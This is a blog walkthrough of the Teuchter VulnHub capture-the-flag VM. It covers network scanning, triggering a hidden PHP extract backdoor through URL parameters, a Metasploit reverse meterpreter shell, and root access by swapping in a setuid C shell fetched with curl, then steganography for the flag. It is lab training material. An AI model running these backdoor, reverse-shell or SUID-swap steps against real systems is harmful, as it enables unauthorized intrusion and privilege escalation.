@@ -1,0 +1,718 @@
+
+								
+																		Hack the Teuchter VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on July 17, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									This post is on the latest CTF challenge “Teuchter” presented by vulnhub for penetration practice and design by knightmare. This virtual machine is having intermediate to the medium difficulty level. One need to break into VM using the web application and from there escalate privileges to gain root access.
+Download it from here: https://www.vulnhub.com/entry/teuchter-03,163/
+Penetrating Methodologies 
+
+Network Scanning (netdiscover, Nmap)
+Abusing HTTP service for PHP extract backdoor
+Compromise victim’s (Metasploit)
+SUID Privilege escalation
+Steganography for original flag.txt
+
+Lets Start!!!
+Let’s start with getting to know the IP of VM (Here, I have it at 192.168.1.104 but you will have to find your own)
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+Now let’s move towards enumeration in context to identify running services and open of victim’s machine by using the most popular tool Nmap.
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.104
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.104
+					
+				
+			
+		
+
+
+Knowing port 80 is open in the victim’s network I preferred to explore his IP in a browser. At first glance, we saw following web page.  When couldn’t found something suspicious, so we try to check its source-code
+
+Hmmm!! After exploring the source code page, you can analysis the “Green color text” sounds a little bit doubtful. Giving priority to /gallery /flicks and /telly we have considered them as the subjective web directories and then try to explore it in the web browser.
+Also, consider hint given for some extension like .pht for PHP.
+
+So I opened the URL http://192.168.1.104/gallery/ but couldn’t get anything neither from its web page nor from its source code.
+
+Then explored the URL http://192.168.1.104/telly/ and it put-up following web page in front of us and at looking at its page source code we notice something like flicks phpinfo.
+
+So without wasting time, we lunch directory brute-force attack on the following URL for identifying .php and .pht extension files.
+
+		
+		
+			
+			
+			
+			
+dirb http://192.168.1.104/flicks/ -X .php,.pht
+			
+				
+					
+				
+					1
+				
+						dirb http://192.168.1.104/flicks/ -X .php,.pht
+					
+				
+			
+		
+
+
+And from its result, we find a phpinfo.pht file and explored it in the browser and it gives me an internal server error when I open it. So I search in Google phpinfo.php found this link: https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html
+Thanks to Mr. Daniel B. Cid for sharing his experience because with help of above link we get the idea to exploit it. As the author has hidden the PHP extract backdoor inside the phpinfo.pht file and now whatever the attacker sends as “ctime” with “atime” as an argument it will be executed successfully.
+As you can observe when we try to execute the system command “id” through the given below URL we got following result on the web page.
+
+		
+		
+			
+			
+			
+			
+192.168.1.104/flicks/phpinfo.php?ctime=system&amp;atime=id
+			
+				
+					
+				
+					1
+				
+						192.168.1.104/flicks/phpinfo.php?ctime=system&amp;atime=id
+					
+				
+			
+		
+
+
+Let’s compromise the victim’s VM to get the meterpreter shell, therefore, we load the Metasploit framework and execute below commands.
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/script/web_delivery
+msf exploit(multi/script/web_delivery) &gt; set target 1
+msf exploit(multi/script/web_delivery) &gt; set payload php/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) &gt; set lhost 192.168.1.107
+msf exploit(multi/script/web_delivery) &gt; exploit
+			
+				
+					
+				
+					12345
+				
+						use exploit/multi/script/web_deliverymsf exploit(multi/script/web_delivery) &gt; set target 1msf exploit(multi/script/web_delivery) &gt; set payload php/meterpreter/reverse_tcpmsf exploit(multi/script/web_delivery) &gt; set lhost 192.168.1.107msf exploit(multi/script/web_delivery) &gt; exploit
+					
+				
+			
+		
+
+Copy the highlighted text for malicious PHP code and Paste it inside the URL as an argument.
+
+You will get the meterpreter session of victim’s machine in your Metasploit framework and after then finished the task by grabbing the flag.txt file. Further type following for extracting more information for post exploitation.
+Here first I sysinfo command to enumerate install kernel version but didn’t found any working exploit for this VM therefore then I decide to go with the manual approach for privilege escalation. Thus execute below commands:
+
+		
+		
+			
+			
+			
+			
+cd /home
+ls
+cd proclaimers
+ls
+cd letterfromamerica
+ls
+			
+				
+					
+				
+					123456
+				
+						cd /homelscd proclaimerslscd letterfromamericals
+					
+				
+			
+		
+
+Here I found two files semaphore and test and if you will notice at their permissions then you will realize that SUID bit enabled for semaphore and GUID bit is enabled for test.
+
+Now let access proper tty shell of victim’s VM and enumerate furthermore inside it.
+
+		
+		
+			
+			
+			
+			
+shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					12
+				
+						shellpython3 -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+ooh!! I got something suspicious file a login.txt from inside /home/jkerr,  and promisedyouamiracle.jpg image. And after reading the note of the login.txt file I decided to download jpg image in our local machine.
+Since the python 3 is already running, therefore, we execute the following command for transferring file.
+
+		
+		
+			
+			
+			
+			
+python3 -m http.server 8080
+			
+				
+					
+				
+					1
+				
+						python3 -m http.server 8080
+					
+				
+			
+		
+
+
+When we explored the promisedyouamiracle.jpg image in the browser we got the following photo.
+
+With help of exiftool, we try to extract metadata from inside this image and luckily found the bas64 encoded text.
+
+		
+		
+			
+			
+			
+			
+exiftool promisedyouamiracle.jpg
+			
+				
+					
+				
+					1
+				
+						exiftool promisedyouamiracle.jpg
+					
+				
+			
+		
+
+
+With the help of the following command, we try to decode the text and got “gemini” which could be a possible password.
+
+		
+		
+			
+			
+			
+			
+echo "Z2VtaW5pCg==" | base64 -d
+			
+				
+					
+				
+					1
+				
+						echo "Z2VtaW5pCg==" | base64 -d
+					
+				
+			
+		
+
+
+Let try to login by using gemini as a password for user: proclaimers because it holds two important files. Execute the following commands and extract the information.
+
+		
+		
+			
+			
+			
+			
+su proclaimers
+password: gemini
+ls
+cd proclaimers
+ls
+cd letterfromamerica
+ls -al
+			
+				
+					
+				
+					1234567
+				
+						su proclaimerspassword: geminilscd proclaimerslscd letterfromamericals -al
+					
+				
+			
+		
+
+Oh Great!! As declared above SUID bit enabled for the semaphore and GUID bit enabled for the test, let’s use grep command to get everything related to semaphore.
+
+		
+		
+			
+			
+			
+			
+grep -R "semaphore" /usr/local 2&gt;/dev/null
+			
+				
+					
+				
+					1
+				
+						grep -R "semaphore" /usr/local 2&gt;/dev/null
+					
+				
+			
+		
+
+Awesome, I got a script at this path /usr/local/bin/numpties.sh; let’s open it with cat command.
+
+		
+		
+			
+			
+			
+			
+cat /usr/local/bin/numpties.sh
+			
+				
+					
+				
+					1
+				
+						cat /usr/local/bin/numpties.sh
+					
+				
+			
+		
+
+After reading it, I conclude that the cronjob will add the SUID bit to semaphore and also give root ownership to this file if the file exists.
+
+No wonder, if I replace the original semaphore by the fake semaphore file then our fake file will get SUID permission. So in our local, we write a C-program to get bash shell and compile it.
+
+		
+		
+			
+			
+			
+			
+include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+Int main ()
+{
+setuid(geteuid ());
+system("/bin/bash");
+}
+			
+				
+					
+				
+					12345678
+				
+						include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;Int main (){setuid(geteuid ());system("/bin/bash");}
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+gcc shell.c -o semaphore
+python -m SimpleHTTPServer 80
+			
+				
+					
+				
+					12
+				
+						gcc shell.c -o semaphorepython -m SimpleHTTPServer 80
+					
+				
+			
+		
+
+ 
+Since we have compiled file semaphores and also running python server, therefore, let’s download our fake semaphore at the place of original semaphores. Thus first I removed original semaphores and download compiled file in the same directory.
+
+		
+		
+			
+			
+			
+			
+rm -rf  semaphore
+curl -O http://192.168.1.107/semaphore
+			
+				
+					
+				
+					12
+				
+						rm -rf  semaphorecurl -O http://192.168.1.107/semaphore
+					
+				
+			
+		
+
+After sometime when I checked the permission for the new semaphore I found the SUID bit was on. At that moment you should run the script which will give root terminal after getting executed and then look for flag inside /root directory.
+
+		
+		
+			
+			
+			
+			
+ls -la
+./semaphore
+cd /root
+cat flag.txt
+			
+				
+					
+				
+					1234
+				
+						ls -la./semaphorecd /rootcat flag.txt
+					
+				
+			
+		
+
+
+This was not actual flag let’s try to get the original flag 
+
+		
+		
+			
+			
+			
+			
+cd root
+ls
+re-record-not-fade-away
+ls -al
+cd on
+ls 
+cd and
+ls
+cd on
+			
+				
+					
+				
+					123456789
+				
+						cd rootlsre-record-not-fade-awayls -alcd onls cd andlscd on
+					
+				
+			
+		
+
+So on………… and at last you will get /ariston which is holding a zip file “TeuchterESX.zip”.
+
+		
+		
+			
+			
+			
+			
+cd ariston
+			
+				
+					
+				
+					1
+				
+						cd ariston
+					
+				
+			
+		
+
+
+Again run the following command in the current directory to transfer zip file.
+
+		
+		
+			
+			
+			
+			
+python3 -m http.server 8080
+			
+				
+					
+				
+					1
+				
+						python3 -m http.server 8080
+					
+				
+			
+		
+
+
+Now download TeuchterESX.zip file in local machine and unzip it.
+
+		
+		
+			
+			
+			
+			
+wget http://192.168.1.103:8080/TeuchterESX.zip
+unzip TeuchterESX.zip
+password: Teuchter
+			
+				
+					
+				
+					123
+				
+						wget http://192.168.1.103:8080/TeuchterESX.zipunzip TeuchterESX.zippassword: Teuchter
+					
+				
+			
+		
+
+
+We got a vmdk file and further I run following command to the list of present drive for mounting disk image.
+
+		
+		
+			
+			
+			
+			
+fdisk -l
+			
+				
+					
+				
+					1
+				
+						fdisk -l
+					
+				
+			
+		
+
+Here we saw /dev/sdb1 which looks good mounting disk image thus I install the vmfs-tools package.
+
+So we have used vmfs-fuse to mount the drive and execute the following commands:
+
+		
+		
+			
+			
+			
+			
+mkdir Teuchter
+vmfs-fuse /dev/sdb1 /root/Desktop/Teuchter/
+cd Teuchter
+ls
+cat hint.txt
+cd redkola
+			
+				
+					
+				
+					123456
+				
+						mkdir Teuchtervmfs-fuse /dev/sdb1 /root/Desktop/Teuchter/cd Teuchterlscat hint.txtcd redkola
+					
+				
+			
+		
+
+In this text messages the author had given hint to check ISO for getting the password which is related to TV advert and it’s of 25 characters.
+
+So we mount the new folder /redkola.iso where we found an image file glass_ch.jpg with help of the following command:
+
+		
+		
+			
+			
+			
+			
+mount redkola.iso /root/Desktop/redkola
+cd /root/Desktop/redkola
+ls
+			
+				
+					
+				
+					123
+				
+						mount redkola.iso /root/Desktop/redkolacd /root/Desktop/redkolals
+					
+				
+			
+		
+
+
+Further, we opened the image “glass_ch.jpg” and it was a picture of Irn-Bru soft-drinks. Probably there could be chances of hidden text in this image, therefore, we tried steghide to extract out hidden text but when I execute the following command it asks to enter some passphrase which we don’t know yet and it should above said 25 characters which we need to be found.
+
+		
+		
+			
+			
+			
+			
+steghide extract -sf glass_ch.jpg -xf /root/Desktop/finalflag.txt
+			
+				
+					
+				
+					1
+				
+						steghide extract -sf glass_ch.jpg -xf /root/Desktop/finalflag.txt
+					
+				
+			
+		
+
+
+Taking help of above hint and image I search Irn-bru-wiki and got this link https://en.wikipedia.org/wiki/Irn-Bru
+And after spending a long time over wiki I got 25 characters in ‘madeinscotlandfromgirders’, which was Irn-Bru advertising slogan and tried it as the passphrase.
+
+We entered the above passphrase and extracted the text file on the desktop.
+
+Congrats!! Finally, we got the final flag.txt
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
